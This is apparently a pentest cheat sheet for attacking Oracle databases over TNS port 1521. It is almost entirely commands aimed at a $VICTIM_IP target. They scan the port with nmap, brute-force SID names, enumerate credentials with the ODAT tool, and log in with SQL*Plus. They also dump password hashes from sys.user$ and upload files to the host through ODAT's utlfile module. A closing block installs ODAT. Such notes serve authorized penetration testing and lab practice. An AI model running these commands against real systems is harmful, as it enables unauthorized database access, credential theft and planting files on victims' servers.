
```bash
# Scan Oracle TNS with Nmap
sudo nmap -p1521 -sV $VICTIM_IP --open

# Brute Force SID Names
sudo nmap -p1521 --script oracle-sid-brute $VICTIM_IP

# Use ODAT to Enumerate Oracle Database creds etc 
./odat.py all -s $VICTIM_IP


# Connect Using SQL*Plus
sqlplus username/password@$VICTIM_IP/SID

# Enumerate Database Info
select table_name from all_tables;
select * from user_role_privs;

# Extract Password Hashes
select name, password from sys.user$;

# Upload Files (if possible)
./odat.py utlfile -s $VICTIM_IP -d <SID> -U $USER -P $PASS --sysdba --putFile <localfile> <remotepath> <localfile>
```

### <span style="color:#50FA7B">Odat</span>
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```